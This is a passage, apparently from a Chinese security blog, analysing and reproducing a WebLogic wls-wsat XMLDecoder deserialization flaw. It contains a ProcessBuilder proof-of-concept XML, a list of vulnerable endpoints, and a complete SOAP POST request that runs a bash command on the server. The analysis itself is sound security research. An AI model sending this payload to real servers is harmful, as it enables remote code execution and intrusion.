+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h5><h6 id="string-标签" class="heading-element"><span>string 标签</span>
+  <a href="#string-%e6%a0%87%e7%ad%be" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p><code>hello,xml</code> 字符串的表示方式为 <code>&lt;string&gt;hello,xml&lt;/string&gt;</code></p>
+<h6 id="object-标签" class="heading-element"><span>object 标签</span>
+  <a href="#object-%e6%a0%87%e7%ad%be" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>通过 <code>&lt;object&gt;</code> 标签表示对象， <code>class</code> 属性指定具体类(用于调用其内部方法)，<code>method</code> 属性指定具体方法名称（比如构造函数的的方法名为 <code>new</code> ）</p>
+<h6 id="void-标签" class="heading-element"><span>void 标签</span>
+  <a href="#void-%e6%a0%87%e7%ad%be" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>通过 <code>void</code> 标签表示函数调用、赋值等操作， <code>method</code> 属性指定具体的方法名称</p>
+<h6 id="array标签" class="heading-element"><span>array标签</span>
+  <a href="#array%e6%a0%87%e7%ad%be" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h6><p>通过 <code>array</code> 标签表示数组， <code>class</code> 属性指定具体类，内部 <code>void</code> 标签的 <code>index</code> 属性表示根据指定数组索引赋值</p>
+<h3 id="利用条件" class="heading-element"><span>利用条件</span>
+  <a href="#%e5%88%a9%e7%94%a8%e6%9d%a1%e4%bb%b6" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>使用 WLS-WebServices 组件</p>
+<p>WebLogic 涉及版本</p>
+<p>10.3.6.0</p>
+<p>12.1.3.0.0</p>
+<p>12.2.1.1.0</p>
+<p>12.2.1.2.0</p>
+<h3 id="漏洞分析-1" class="heading-element"><span>漏洞分析</span>
+  <a href="#%e6%bc%8f%e6%b4%9e%e5%88%86%e6%9e%90-1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><h4 id="原理解析" class="heading-element"><span>原理解析</span>
+  <a href="#%e5%8e%9f%e7%90%86%e8%a7%a3%e6%9e%90" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>上面看到了 Decoder 可以把 xml 解析成 Javabeans，而这里 WebLogic 的 WLS Security 组件对外提供得 WebService 服务，就是使用 XMLDecoder 来解析 XML 格式数据，其存在反序列化漏洞，从而导致 RCE，来看个demo</p>
+<p>decode.java</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">org.example</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.beans.XMLDecoder</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.BufferedInputStream</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.io.FileInputStream</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">decoder</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">FileInputStream</span><span class="w"> </span><span class="n">file</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">FileInputStream</span><span class="p">(</span><span class="s">&#34;D:\\14.Java\\java_test\\test\\poc.xml&#34;</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">XMLDecoder</span><span class="w"> </span><span class="n">xmlDecoder</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">XMLDecoder</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">BufferedInputStream</span><span class="p">(</span><span class="n">file</span><span class="p">));</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">xmlDecoder</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">xmlDecoder</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>poc.xml</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">&lt;</span><span class="n">java</span><span class="w"> </span><span class="n">version</span><span class="o">=</span><span class="s">&#34;1.4.0&#34;</span><span class="w"> </span><span class="kd">class</span><span class="err">=&#34;</span><span class="nc">java</span><span class="p">.</span><span class="na">beans</span><span class="p">.</span><span class="na">XMLDecoder</span><span class="s">&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s">    &lt;void class=&#34;</span><span class="n">java</span><span class="p">.</span><span class="na">lang</span><span class="p">.</span><span class="na">ProcessBuilder</span><span class="s">&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s">        &lt;array class=&#34;</span><span class="n">java</span><span class="p">.</span><span class="na">lang</span><span class="p">.</span><span class="na">String</span><span class="s">&#34; length=&#34;</span><span class="n">1</span><span class="s">&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s">            &lt;void index=&#34;</span><span class="n">0</span><span class="s">&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s">                &lt;string&gt;Calc&lt;/string&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s">            &lt;/void&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s">        &lt;/array&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s">        &lt;void method=&#34;</span><span class="n">start</span><span class="s">&#34;/&gt;&lt;/void&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s">&lt;/java&gt;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>解析这个xml，相当于用 <code>java.lang.ProcessBuilder</code> 来 rce，相当于执行以下代码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">String[] cmd = new String[1];
+</span></span><span class="line"><span class="cl">cmd[0] = &#34;Calc&#34;;
+</span></span><span class="line"><span class="cl">new ProcessBuilder(cmd).start();</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="漏洞复现-1" class="heading-element"><span>漏洞复现</span>
+  <a href="#%e6%bc%8f%e6%b4%9e%e5%a4%8d%e7%8e%b0-1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>下面几个路由都能解析 xml</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/wls-wsat/CoordinatorPortType
+</span></span><span class="line"><span class="cl">/wls-wsat/RegistrationPortTypeRPC
+</span></span><span class="line"><span class="cl">/wls-wsat/ParticipantPortType
+</span></span><span class="line"><span class="cl">/wls-wsat/RegistrationRequesterPortType
+</span></span><span class="line"><span class="cl">/wls-wsat/CoordinatorPortType11
+</span></span><span class="line"><span class="cl">/wls-wsat/RegistrationPortTypeRPC11
+</span></span><span class="line"><span class="cl">/wls-wsat/ParticipantPortType11
+</span></span><span class="line"><span class="cl">/wls-wsat/RegistrationRequesterPortType11</span></span></code></pre></td></tr></table>
+</div>
+</div><p>POST 请求包</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/wls-wsat/RegistrationRequesterPortType11</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">192.168.2.128:7001</span>
+</span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate, br</span>
+</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">keep-alive</span>
+</span></span><span class="line"><span class="cl"><span class="n">Cookie</span><span class="o">:</span> <span class="l">ADMINCONSOLESESSION=pG6NyP1TRTBQpCtbTcGdmT4FHw76PxC1nn6WrKbLVGhQ1LtxJLJv!441898134</span>
+</span></span><span class="line"><span class="cl"><span class="n">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Priority</span><span class="o">:</span> <span class="l">u=0, i</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">text/xml</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">680</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;soapenv:Envelope</span> <span class="na">xmlns:soapenv=</span><span class="s">&#34;http://schemas.xmlsoap.org/soap/envelope/&#34;</span><span class="nt">&gt;</span> <span class="nt">&lt;soapenv:Header&gt;</span>  
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;work:WorkContext</span> <span class="na">xmlns:work=</span><span class="s">&#34;http://bea.com/2004/06/soap/workarea/&#34;</span><span class="nt">&gt;</span>  
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;java</span> <span class="na">version=</span><span class="s">&#34;1.4.0&#34;</span> <span class="na">class=</span><span class="s">&#34;java.beans.XMLDecoder&#34;</span><span class="nt">&gt;</span>  
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;void</span> <span class="na">class=</span><span class="s">&#34;java.lang.ProcessBuilder&#34;</span><span class="nt">&gt;</span>  
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;array</span> <span class="na">class=</span><span class="s">&#34;java.lang.String&#34;</span> <span class="na">length=</span><span class="s">&#34;3&#34;</span><span class="nt">&gt;</span>  
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;void</span> <span class="na">index=</span><span class="s">&#34;0&#34;</span><span class="nt">&gt;</span>  
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;string&gt;</span>/bin/bash<span class="nt">&lt;/string&gt;</span>  
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/void&gt;</span>  
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;void</span> <span class="na">index=</span><span class="s">&#34;1&#34;</span><span class="nt">&gt;</span>  
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;string&gt;</span>-c<span class="nt">&lt;/string&gt;</span>  
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/void&gt;</span>  
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;void</span> <span class="na">index=</span><span class="s">&#34;2&#34;</span><span class="nt">&gt;</span>  
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;string&gt;</span>echo &#34;/wls-wsat/RegistrationRequesterPortType11&#34;&gt;&gt;/tmp/eeee<span class="nt">&lt;/string&gt;</span>  
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/void&gt;</span>  
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/array&gt;</span>  
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;void</span> <span class="na">method=</span><span class="s">&#34;start&#34;</span><span class="nt">/&gt;&lt;/void&gt;</span>  
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/java&gt;</span>  
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/work:WorkContext&gt;</span>  
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/soapenv:Header&gt;</span>  
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;soapenv:Body/&gt;</span>  
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/soapenv:Envelope&gt;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>根据要执行的命令调整 index 和对应的参数就好了</p>
+<p><img loading="lazy" src="https://bu.dusays.com/2025/05/11/682041b472717.png" alt="image-20250428180342464" srcset="https://bu.dusays.com/2025/05/11/682041b472717.png?size=small, https://bu.dusays.com/2025/05/11/682041b472717.png?size=medium 1.5x, https://bu.dusays.com/2025/05/11/682041b472717.png?size=large 2x" data-title="image-20250428180342464" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>稍微解释一下以上 poc ，xml 部分不多说，说下SOAP 请求结构</p>
+<ul>
+<li>Envelope：定义了 SOAP 消息的外层结构，使用的是标准的 SOAP Envelope 命名空间。</li>
+<li>Header：SOAP 消息中用来包含头部信息，这里特别使用了 <code>WorkContext</code>，这是 WebLogic Server 特有的机制，用于在 SOAP 请求中传递上下文或状态信息。</li>
+</ul>
+<p>所以这个洞的本质其实是通过伪造的 SOAP 报文，把恶意的 XML 数据发送到服务器端，由服务器的 XMLDecoder 解析并实例化对象，从而触发任意代码执行</p>
+<h4 id="代码分析" class="heading-element"><span>代码分析</span>
+  <a href="#%e4%bb%a3%e7%a0%81%e5%88%86%e6%9e%90" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p><code>server/lib/wls-wsat.war/WEB-INF/web.xml</code> 中的接口都能对 SOAP 报文进行处理，也就是刚才那几个存在漏洞的路由接口</p>
+<p><img loading="lazy" src="https://bu.dusays.com/2025/05/11/682041b4c3c95.png" alt="image-20250428211934727" srcset="https://bu.dusays.com/2025/05/11/682041b4c3c95.png?size=small, https://bu.dusays.com/2025/05/11/682041b4c3c95.png?size=medium 1.5x, https://bu.dusays.com/2025/05/11/682041b4c3c95.png?size=large 2x" data-title="image-20250428211934727" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>定位到 <code>weblogic.wsee.jaxws.workcontext.WorkContextServerTube</code> 的 <code>processRequest</code> 方法，这里对我们 POST 数据包中的 SOAP 数据进行了处理</p>
+<p>这里可以看到 var1 就是我们传入的 xml 数据，var2 就是筛选出了XML 中 <code>&lt;soapenv:Header&gt;</code> 标签下的所有子元素</p>
+<p><img loading="lazy" src="https://bu.dusays.com/2025/05/11/682041b4c381d.png" alt="image-20250428212336617" srcset="https://bu.dusays.com/2025/05/11/682041b4c381d.png?size=small, https://bu.dusays.com/2025/05/11/682041b4c381d.png?size=medium 1.5x, https://bu.dusays.com/2025/05/11/682041b4c381d.png?size=large 2x" data-title="image-20250428212336617" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>然后把 var3 放进了 <code>readHeaderOld()</code> 方法进行处理</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="w">    </span><span class="kd">protected</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">readHeaderOld</span><span class="p">(</span><span class="n">Header</span><span class="w"> </span><span class="n">var1</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="n">XMLStreamReader</span><span class="w"> </span><span class="n">var2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">var1</span><span class="p">.</span><span class="na">readHeader</span><span class="p">();</span><span class="w">
